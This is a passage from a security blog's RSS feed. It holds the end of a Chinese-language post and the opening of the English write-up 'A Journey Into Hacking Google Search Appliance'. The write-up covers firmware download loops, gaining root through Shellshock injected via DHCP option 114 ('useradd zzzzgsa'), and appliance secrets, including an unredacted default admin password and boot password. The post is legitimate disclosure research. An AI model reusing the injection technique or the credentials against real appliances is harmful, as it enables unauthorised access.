      &lt;td&gt;2019/04/26&lt;/td&gt;
      &lt;td&gt;é‡‹å‡º GSA 7.6.512.G18ï¼Œæ‡‰è©²ç‚ºæœ€å¾Œä¸€å€‹ç‰ˆæœ¬&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2021/08/16&lt;/td&gt;
      &lt;td&gt;å›å ±æ¼æ´&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2021/08/16&lt;/td&gt;
      &lt;td&gt;æ”¶åˆ°æ©Ÿå™¨äººå›æ‡‰ç¢ºèªæ”¶åˆ°å›å ±ä¿¡ä»¶&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2021/08/16&lt;/td&gt;
      &lt;td&gt;å•é¡Œæ–¼ issuetracker.google.com è¢«æŒ‡æ´¾&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2021/08/18&lt;/td&gt;
      &lt;td&gt;Google æç¤ºæ¼æ´ä¸ç¬¦åˆçé‡‘æ¢ä»¶ï¼Œä½†æœƒæ–¼ä¸‹æ¬¡æœƒè­°å†æ¬¡è¨è«–&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2021/08/20&lt;/td&gt;
      &lt;td&gt;ç¢ºèªæ¼æ´ä¸ç™¼æ”¾çé‡‘&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2021/11/01&lt;/td&gt;
      &lt;td&gt;è©¢å•æ¼æ´æ˜¯å¦æœƒæŒ‡æ´¾ CVE æ¼æ´ç·¨è™Ÿ&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2021/11/02&lt;/td&gt;
      &lt;td&gt;ç¢ºèªä¸æœƒæœ‰ CVE æ¼æ´ç·¨è™Ÿ&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2023 ä¸ŠåŠå¹´&lt;/td&gt;
      &lt;td&gt;é–‹å§‹ç·¨å¯«æ–‡ç« &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2023/06/04&lt;/td&gt;
      &lt;td&gt;åˆç¨¿å®Œæˆ&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h3 id=&quot;çµè«–&quot;&gt;çµè«–&lt;/h3&gt;

&lt;p&gt;é›–ç„¶ GSA/vGSA å·²ç¶“æ˜¯çµæŸç”Ÿå‘½å‘¨æœŸçš„ç”¢å“ï¼Œä½†ç ”ç©¶ Google å¦‚ä½•å°è¨­å‚™å»å¢åŠ ç”¢å“çš„å®‰å…¨æ€§åŠæ¸›å°‘æ”»æ“Šå‘é‡
å¯ä»¥å¢åŠ å¹³å¸¸è¼ƒå°‘æ¥è§¸çš„çŸ¥è­˜é¢ã€‚é›–ç„¶æ–‡ä¸­æ²’æœ‰è©³ç´°èªªæ˜ï¼ŒåŒ…å«å¦‚ä½¿ç”¨ Java çš„ Security Managerï¼Œ
Linux Kernel çš„ seccomp éƒ½æ˜¯ GSA ä¸­æœ‰ä½¿ç”¨çš„æŠ€è¡“ï¼Œè€Œæœ¬æ¬¡ç ”ç©¶ä¸­ä¹Ÿç•™ä¸‹ä¸€äº›å¯ä¾›å¾ŒçºŒç ”ç©¶çš„ç›®æ¨™ï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;feedergate æœå‹™&lt;/li&gt;
  &lt;li&gt;Oracle çš„ Outside-in Technology è½‰æ›æ–‡ä»¶æ ¼å¼çš„è¨˜æ†¶é«”æ¼æ´&lt;/li&gt;
  &lt;li&gt;convert_to_html seccomp sandbox&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;æœ‰ç ”ç©¶æˆæœæ™‚å†è·Ÿå¤§å®¶åˆ†äº«ï¼Œä¸‹æ¬¡è¦‹ã€‚&lt;/p&gt;

&lt;h3 id=&quot;å…¶ä»–åƒè€ƒç¶²å€&quot;&gt;å…¶ä»–åƒè€ƒç¶²å€&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf&quot;&gt;https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://opnsec.com/2018/07/into-the-borg-ssrf-inside-google-production-network/&quot;&gt;https://opnsec.com/2018/07/into-the-borg-ssrf-inside-google-production-network/&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.exploit-db.com/exploits/1333&quot;&gt;https://www.exploit-db.com/exploits/1333&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://commons.erau.edu/cgi/viewcontent.cgi?article=1153&amp;amp;context=jdfsl&quot;&gt;https://commons.erau.edu/cgi/viewcontent.cgi?article=1153&amp;amp;context=jdfsl&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.anandtech.com/show/2407&quot;&gt;https://www.anandtech.com/show/2407&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://groups.google.com/g/google-search-appliance-help/c/Qn5aO5r2Joo/m/PTw8ZDWu6vYJ&quot;&gt;https://groups.google.com/g/google-search-appliance-help/c/Qn5aO5r2Joo/m/PTw8ZDWu6vYJ&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/google/subpar&quot;&gt;https://github.com/google/subpar&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://insinuator.net/2016/03/classical-web-vulns-found-in-google-search-appliance-7-4/&quot;&gt;https://insinuator.net/2016/03/classical-web-vulns-found-in-google-search-appliance-7-4/&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/kubernetes/kubernetes/issues/57760#issuecomment-356466614&quot;&gt;https://github.com/kubernetes/kubernetes/issues/57760#issuecomment-356466614&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2014-0362&quot;&gt;https://nvd.nist.gov/vuln/detail/CVE-2014-0362&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=un01LMLMuis&quot;&gt;https://www.youtube.com/watch?v=un01LMLMuis&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=K-sEER8CK0U&quot;&gt;https://www.youtube.com/watch?v=K-sEER8CK0U&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://technical-fundas.blogspot.com/2016/05/google-search-appliance-migrate.html?&quot;&gt;http://technical-fundas.blogspot.com/2016/05/google-search-appliance-migrate.html?&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

</description>
                <link>https://devco.re/blog/2023/07/07/a-journey-into-hacking-google-search-appliance/</link>
                <guid>https://devco.re/blog/2023/07/07/a-journey-into-hacking-google-search-appliance</guid>
                <pubDate>Fri, 07 Jul 2023 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>[REL] A Journey Into Hacking Google Search Appliance</title>
                <description>&lt;p&gt;&lt;a href=&quot;/blog/2023/07/07/a-journey-into-hacking-google-search-appliance-en&quot;&gt;English Version&lt;/a&gt;, &lt;a href=&quot;/blog/2023/07/07/a-journey-into-hacking-google-search-appliance/&quot;&gt;ä¸­æ–‡ç‰ˆæœ¬&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;tldr&quot;&gt;TL;DR&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;GSA Admin console post-authentication Remote Code Execution.&lt;/li&gt;
  &lt;li&gt;GSA Search interface Path traversal.&lt;/li&gt;
  &lt;li&gt;GSA uses Oracleâ€™s Outside-in Technology to convert documents.&lt;/li&gt;
  &lt;li&gt;Google Web services have some fixed URIs that provide information about the service itself.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;introduction&quot;&gt;Introduction&lt;/h3&gt;

&lt;p&gt;The Google Search Appliance (hereinafter referred to as GSA) is an enterprise search device launched by Google in 2002, used for indexing and retrieving internal or public network information. Around 2005, Google introduced the Google Mini for personal and small business use. Later, at the end of 2008, a virtual machine version was launched, called the Virtual Google Search Appliance (hereinafter referred to as VGSA). However, at the end of 2018, Google ended the life cycle of the GSA product and integrated it into the Cloud Search product line.&lt;/p&gt;

&lt;h3 id=&quot;appliance-and-software-acquisition&quot;&gt;Appliance and Software Acquisition&lt;/h3&gt;

&lt;p&gt;We managed to purchase a device by searching â€œGoogle Search Applianceâ€ on eBay.&lt;/p&gt;

&lt;p&gt;Luckily, the first one we bought was a GSA with unerased data:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Even now, you can still find devices that are currently being sold.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;On the other hand, The original public link of vGSA has been removed.
http://dl.google.com/vgsa/vgsa_20090210.7z [removed]
http://dl.google.com/vgsa/vgsa_20081028.7z [removed]&lt;/p&gt;

&lt;p&gt;We found the file on BitTorrent magnet link:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;magnet:?xt=urn:btih:89388ACE8C3B91FDD3A2F86D8CBB78C58A70D992&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Next, found the link to the old version software from Google Groups:
https://groups.google.com/g/google-search-appliance-help/c/Qn5aO5r2Joo/m/PTw8ZDWu6vYJ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The link was:&lt;/p&gt;

&lt;p&gt;http://dl.google.com/dl/enterprise/install_bundle-10000622-7.2.0-112.bin [removed]&lt;/p&gt;

&lt;p&gt;And we can obtain all version number from:
&lt;a href=&quot;http://web.archive.org/web/20210116194907/https://support.google.com/gsa/answer/7020590?hl=en&amp;amp;ref_topic=2709671&quot;&gt;http://web.archive.org/web/20210116194907/https://support.google.com/gsa/answer/7020590?hl=en&amp;amp;ref_topic=2709671&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Guessing the File Naming Rules as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;install_bundle-10000(3-digit numbers)-7.(numbers).(numbers)-(numbers).bin&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;And write a shell script to attempt downloading software:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;622&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;j&amp;lt;999&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;+j&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;do for&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;i&amp;lt;444&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;+i&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;wget http://dl.google.com/dl/enterprise/install_bundle-10000&lt;span class=&quot;nv&quot;&gt;$j&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-7&lt;/span&gt;.2.0-&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;.bin&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;done
for&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;661&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;j&amp;lt;999&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;+j&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;do for&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;i&amp;lt;444&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;+i&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;wget http://dl.google.com/dl/enterprise/install_bundle-10000&lt;span class=&quot;nv&quot;&gt;$j&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-7&lt;/span&gt;.4.0-&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;.bin&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;done
for&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;693&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;j&amp;lt;999&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;+j&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;do for&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;i&amp;lt;444&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;+i&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;wget http://dl.google.com/dl/enterprise/install_bundle-10000&lt;span class=&quot;nv&quot;&gt;$j&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-7&lt;/span&gt;.6.0-&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;.bin&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Including the information found through internet search, successfully retrieved the following file:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;all_langs-lang-pack-2.1-1.bin
all_langs-lang-pack-2.2-1.bin
centos_patch_files-6.0.0-22.bin
centos_patch_files-6.14.0-28.bin
centos_patch_files-7.0.14-238.bin
centos_patch_files-7.2.0-252.bin
centos_patch_files-7.2.0-264.bin
centos_patch_files-7.2.0-270.bin
centos_patch_files-7.2.0-280.bin
centos_patch_files-7.2.0-286.bin
install_bundle-10000653-7.2.0-252.bin
install_bundle-10000658-7.2.0-264.bin
install_bundle-10000661-7.2.0-270.bin
install_bundle-10000681-7.4.0-64.bin
install_bundle-10000685-7.4.0-72.bin
install_bundle-10000686-7.4.0-74.bin
install_bundle-10000692-7.4.0-82.bin
install_bundle-10000762-7.6.0-36.bin
install_bundle-10000767-7.6.0-42.bin
install_bundle-10000772-7.6.0-46.bin
install_bundle-10000781-7.6.0-58.bin
install_bundle-10000810-7.6.50-30.bin
install_bundle-10000822-7.6.50-36.bin
install_bundle-10000855-7.6.50-64.bin
install_bundle-10000878-7.6.250-12.bin
install_bundle-10000888-7.6.250-20.bin
install_bundle-10000901-7.6.250-26.bin
install_bundle-10000915-7.6.360-10.bin
install_bundle-10000926-7.6.360-16.bin
install_bundle-10000967-7.6.512-18.bin
sw_files-5.0.4-22.bin
sw_files-6.14.0-28.bin
sw_files-7.0.14-238.bin
vm_patch_1_for_504_G22_and_G24_only.bin
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;vgsa-virtual-google-search-appliance&quot;&gt;vGSA (Virtual Google Search Appliance)&lt;/h3&gt;

&lt;p&gt;Next, we began research on vGSA. By default, after importing the virtual machine, 
this system only provides a function for network configuration and doesnâ€™t provide a system shell for operation or use.
However, because the virtual machine operates within ours own environment,
it is usually possible to obtain system permissions through the following methods:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Directly altering unencrypted disk files&lt;/li&gt;
  &lt;li&gt;Modifying the virtual machine memory&lt;/li&gt;
  &lt;li&gt;Booting using CDs or disks from another operating system&lt;/li&gt;
  &lt;li&gt;Exploiting known vulnerabilities&lt;/li&gt;
  &lt;li&gt;Utilizing hard-coded administrator or system account passwords&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The following image shows the network configuration screen:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;cve-2014-6271&quot;&gt;CVE-2014-6271&lt;/h4&gt;

&lt;p&gt;When testing early Linux appliances and servers, especially those using the RedHat series operating system, 
there are often Shellshock vulnerabilities, and the 2008 released vGSA is no exception.
Inserting option 114 in the DHCP server will be set in the environment variable, 
thereby triggering the vulnerability and executing any command.&lt;/p&gt;

&lt;p&gt;The command attempted to be inserted is: 
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;useradd zzzzgsa&lt;/code&gt;. 
This command can be observed to be executed repeatedly, as error messages continue to appear in the console output.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;vgsa-operation-system-observation&quot;&gt;vGSA operation system observation&lt;/h4&gt;

&lt;p&gt;After successfully obtaining operating system privileges,
we can observe the network environment, 
the running applications, and the file system.
Here are some insights gained from observing the operating system environment:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Version number is 5.2.0.G.27.&lt;/li&gt;
  &lt;li&gt;Services are mainly written in C/C++, Java, Python.&lt;/li&gt;
  &lt;li&gt;/export/hda3 seems to be the directory primarily used by the service.&lt;/li&gt;
  &lt;li&gt;/etc/shadow contains the root account with password hash xâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆM.&lt;/li&gt;
  &lt;li&gt;Administration interface listening on port 8000, 8443 with default admin password, j0njlRXpU5CQ.&lt;/li&gt;
  &lt;li&gt;/.gnupg contains ent_box_key public and private keys.&lt;/li&gt;
  &lt;li&gt;/.gnupg contains google_license_key public key.&lt;/li&gt;
  &lt;li&gt;/.ssh/authorized_keys contains two sets of public keys.&lt;/li&gt;
  &lt;li&gt;/root/.ssh/authorized_keys contains one set of public keys.&lt;/li&gt;
  &lt;li&gt;/root/.ssh/ contains two sets of SSH public and private keys.&lt;/li&gt;
  &lt;li&gt;/root/.gnupg/ contains ent_box_key public and private keys.&lt;/li&gt;
  &lt;li&gt;Oracleâ€™s Outside In Technology is used to convert documents into HTML web pages.&lt;/li&gt;
  &lt;li&gt;The Java runtime environment uses a Security Manager for protection.&lt;/li&gt;
  &lt;li&gt;The request for engineer support function uses ppp to build a virtual private network, /etc/ppp/chap-secrets contains account passwords ( zâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆcã€]â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆT  ).&lt;/li&gt;
  &lt;li&gt;The boot menu password in /etc/lilo.conf is cmBalx7.&lt;/li&gt;
  &lt;li&gt;/export/hda3/versionmanager/google_key.symmetric has a string that seems to be used for symmetric encryption.&lt;/li&gt;
  &lt;li&gt;/export/hda3/versionmanager/vmanager_passwd contains two sets of username-password combinations ( adminï¼š Mâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆw=:9â–ˆâ–ˆ=  googleï¼šwâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆo=:Nâ–ˆâ–ˆ= ).&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Executable programs with network services are as follows:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Listen Port&lt;/th&gt;
      &lt;th&gt;Process Name&lt;/th&gt;
      &lt;th&gt;Program Language&lt;/th&gt;
      &lt;th&gt;Function&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;22&lt;/td&gt;
      &lt;td&gt;ssh&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;OpenSSH Server&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;53&lt;/td&gt;
      &lt;td&gt;named&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;Bind Named&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;953&lt;/td&gt;
      &lt;td&gt;named&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;Bind Named&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;1111&lt;/td&gt;
      &lt;td&gt;webserver_config&lt;/td&gt;
      &lt;td&gt;python&lt;/td&gt;
      &lt;td&gt;Installer&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2100&lt;/td&gt;
      &lt;td&gt;adminrunner.py&lt;/td&gt;
      &lt;td&gt;python&lt;/td&gt;
      &lt;td&gt;admin console backend&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;3990&lt;/td&gt;
      &lt;td&gt;monitor&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;monitor&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;4000&lt;/td&gt;
      &lt;td&gt;rtserver&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;unknown&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;4430&lt;/td&gt;
      &lt;td&gt;EnterpriseFrontend&lt;/td&gt;
      &lt;td&gt;Java (with security manager)&lt;/td&gt;
      &lt;td&gt;admin console frontend&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;4911&lt;/td&gt;
      &lt;td&gt;borgmon&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;borgmon&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;4916&lt;/td&gt;
      &lt;td&gt;reactor&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;unknown&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;5000&lt;/td&gt;
      &lt;td&gt;rtserver&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;unknown&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;5600&lt;/td&gt;
      &lt;td&gt;rtserver&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;unknown&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;6600&lt;/td&gt;
      &lt;td&gt;cacheserver&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;unknown&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;7800&lt;/td&gt;
      &lt;td&gt;EnterpriseFrontend&lt;/td&gt;
      &lt;td&gt;Java (with security manager)&lt;/td&gt;
      &lt;td&gt;admin console frontend (http)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;7880&lt;/td&gt;
      &lt;td&gt;TableServer&lt;/td&gt;
      &lt;td&gt;Java (with security manager)&lt;/td&gt;
      &lt;td&gt;unknown&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;7882&lt;/td&gt;
      &lt;td&gt;AuthzChecker&lt;/td&gt;
      &lt;td&gt;Java (without security manager)&lt;/td&gt;
      &lt;td&gt;unknown&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;7886&lt;/td&gt;
      &lt;td&gt;tomcat&lt;/td&gt;
      &lt;td&gt;Java&lt;/td&gt;
      &lt;td&gt;tomcat server&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;8000&lt;/td&gt;
      &lt;td&gt;EnterpriseAdminConsole&lt;/td&gt;
      &lt;td&gt;Java (without security manager)&lt;/td&gt;
      &lt;td&gt;unknown&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;8443&lt;/td&gt;
      &lt;td&gt;stunnel&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;redirect http to https&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;8888&lt;/td&gt;
      &lt;td&gt;GWS&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;unknown&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;9300&lt;/td&gt;
      &lt;td&gt;oneboxserver&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;unknown&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;9328&lt;/td&gt;
      &lt;td&gt;entspellmixer&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;unknown&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;9400&lt;/td&gt;
      &lt;td&gt;mixserver&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;unknown&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;9402&lt;/td&gt;
      &lt;td&gt;mixserver&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;unknown&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;9448&lt;/td&gt;
      &lt;td&gt;qrewrite&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;unknown&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;9450&lt;/td&gt;
      &lt;td&gt;EnterpriseAdminConsole&lt;/td&gt;
      &lt;td&gt;Java (without security manager )&lt;/td&gt;
      &lt;td&gt;unknown&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;10094&lt;/td&gt;
      &lt;td&gt;enterprise_onebox&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;unknown&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;10200&lt;/td&gt;
      &lt;td&gt;clustering_server&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;unknown&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;11913&lt;/td&gt;
